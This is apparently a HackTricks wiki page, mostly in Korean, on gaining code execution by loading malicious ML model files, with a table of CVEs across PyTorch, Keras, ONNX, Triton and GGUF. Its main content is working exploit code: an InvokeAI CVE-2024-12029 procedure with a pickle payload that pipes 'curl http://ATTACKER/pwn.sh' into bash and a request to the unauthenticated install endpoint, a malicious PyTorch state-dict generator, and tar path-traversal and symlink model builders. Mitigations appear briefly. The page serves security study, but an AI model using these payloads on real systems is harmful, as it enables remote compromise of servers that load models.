# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Loading models to RCE

Machine Learning 모델은 일반적으로 ONNX, TensorFlow, PyTorch 등 다양한 형식으로 공유됩니다. 이러한 모델은 개발자의 머신이나 프로덕션 시스템에 로드되어 사용될 수 있습니다. 일반적으로 모델에는 악성 코드가 포함되지 않아야 하지만, 모델 로딩 라이브러리의 취약점이나 의도된 기능으로 인해 시스템에서 임의 코드를 실행하는 데 사용될 수 있는 경우가 있습니다.

이 글을 작성할 당시 이러한 유형의 취약점의 몇 가지 예는 다음과 같습니다:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | 악성 pickle이 모델 체크포인트에서 코드 실행으로 이어짐 ( `weights_only` 보호 장치를 우회함)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + 악성 모델 다운로드로 코드 실행 발생; 관리 API에서 Java deserialization RCE                                                    | |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | YAML에서 모델 로딩 시 `yaml.unsafe_load` 사용 (코드 실행) <br> **Lambda** 레이어로 모델 로딩 시 임의의 Python 코드 실행            | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | 조작된 `.tflite` 모델이 정수 오버플로우를 유발 → 힙 손상 (잠재적 RCE)                                                                  | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | `joblib.load`를 통해 모델을 로딩하면 공격자의 `__reduce__` 페이로드가 포함된 pickle이 실행됨                                       | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` 기본값이 피클된 객체 배열을 허용 – 악성 `.npy/.npz`가 코드 실행을 유발함                                              | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX 모델의 외부 가중치 경로가 디렉토리를 탈출할 수 있음 (임의 파일 읽기) <br> 악성 ONNX 모델 tar가 임의 파일을 덮어쓸 수 있음 (RCE로 이어짐) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | 사용자 정의 연산자가 있는 모델은 공격자의 네이티브 코드를 로딩해야 함; 복잡한 모델 그래프가 논리를 남용하여 의도하지 않은 계산을 실행함 | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | `--model-control`이 활성화된 모델 로드 API를 사용하면 상대 경로 탐색이 가능하여 파일을 쓸 수 있음 (예: RCE를 위한 `.bashrc` 덮어쓰기) | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | 잘못된 GGUF 모델 파일이 파서에서 힙 버퍼 오버플로우를 유발하여 피해 시스템에서 임의 코드 실행을 가능하게 함                        | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | 악성 HDF5 (`.h5`) 모델이 Lambda 레이어 코드를 포함하고 있어 로딩 시 여전히 실행됨 (Keras safe_mode가 구형 포맷을 커버하지 않음 – “다운그레이드 공격”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | 많은 ML 도구 (예: pickle 기반 모델 형식, Python `pickle.load`)는 완화되지 않는 한 모델 파일에 포함된 임의 코드를 실행함          | |

또한, [PyTorch](https://github.com/pytorch/pytorch/security)에서 사용되는 것과 같은 Python pickle 기반 모델은 `weights_only=True`로 로드되지 않으면 시스템에서 임의 코드를 실행하는 데 사용될 수 있습니다. 따라서, 테이블에 나열되지 않은 경우에도 모든 pickle 기반 모델은 이러한 유형의 공격에 특히 취약할 수 있습니다.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI`는 Stable-Diffusion을 위한 인기 있는 오픈 소스 웹 인터페이스입니다. 버전 **5.3.1 – 5.4.2**는 사용자가 임의의 URL에서 모델을 다운로드하고 로드할 수 있도록 하는 REST 엔드포인트 `/api/v2/models/install`를 노출합니다.

내부적으로 이 엔드포인트는 결국 다음을 호출합니다:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
제공된 파일이 **PyTorch 체크포인트 (`*.ckpt`)**인 경우, `torch.load`는 **픽클 역직렬화**를 수행합니다. 콘텐츠가 사용자 제어 URL에서 직접 오기 때문에, 공격자는 체크포인트 내에 사용자 정의 `__reduce__` 메서드를 가진 악성 객체를 삽입할 수 있습니다. 이 메서드는 **역직렬화** 중에 실행되어 **원격 코드 실행 (RCE)**을 InvokeAI 서버에서 유발합니다.

이 취약점은 **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %)로 할당되었습니다.

#### 악용 절차

1. 악성 체크포인트 생성:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. 당신이 제어하는 HTTP 서버에 `payload.ckpt`를 호스팅합니다 (예: `http://ATTACKER/payload.ckpt`).
3. 취약한 엔드포인트를 트리거합니다 (인증 필요 없음):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. InvokeAI가 파일을 다운로드할 때 `torch.load()`를 호출합니다 → `os.system` 가젯이 실행되고 공격자는 InvokeAI 프로세스의 컨텍스트에서 코드 실행을 얻습니다.

Ready-made exploit: **Metasploit** 모듈 `exploit/linux/http/invokeai_rce_cve_2024_12029`가 전체 흐름을 자동화합니다.

#### 조건

•  InvokeAI 5.3.1-5.4.2 (스캔 플래그 기본값 **false**)
•  `/api/v2/models/install` 공격자가 접근 가능
•  프로세스가 셸 명령을 실행할 수 있는 권한을 가짐

#### 완화 조치

* **InvokeAI ≥ 5.4.3**로 업그레이드 – 패치는 기본적으로 `scan=True`로 설정하고 역직렬화 전에 악성 코드 스캔을 수행합니다.
* 체크포인트를 프로그래밍적으로 로드할 때 `torch.load(file, weights_only=True)` 또는 새로운 [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) 헬퍼를 사용합니다.
* 모델 소스에 대한 허용 목록 / 서명을 시행하고 최소 권한으로 서비스를 실행합니다.

> ⚠️ **모든** Python pickle 기반 형식(많은 `.pt`, `.pkl`, `.ckpt`, `.pth` 파일 포함)은 신뢰할 수 없는 소스에서 역직렬화하는 것이 본질적으로 안전하지 않다는 것을 기억하세요.

---

역방향 프록시 뒤에서 이전 InvokeAI 버전을 계속 실행해야 하는 경우의 임시 완화 조치 예:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
## 예시 – 악성 PyTorch 모델 만들기

- 모델 생성:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- 모델 로드:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
## Models to Path Traversal

As commented in [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), 대부분의 AI 프레임워크에서 사용되는 모델 형식은 아카이브를 기반으로 하며, 일반적으로 `.zip`입니다. 따라서 이러한 형식을 악용하여 경로 탐색 공격을 수행할 수 있으며, 모델이 로드된 시스템에서 임의의 파일을 읽을 수 있습니다.

For example, with the following code you can create a model that will create a file in the `/tmp` directory when loaded:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
다음 코드를 사용하면 로드될 때 `/tmp` 디렉토리에 대한 심볼릭 링크를 생성하는 모델을 만들 수 있습니다:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
## References

- [OffSec 블로그 – "CVE-2024-12029 – InvokeAI 신뢰할 수 없는 데이터의 역직렬화"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI 패치 커밋 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit 모듈 문서](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – torch.load에 대한 보안 고려사항](https://pytorch.org/docs/stable/notes/serialization.html#security)

{{#include ../banners/hacktricks-training.md}}
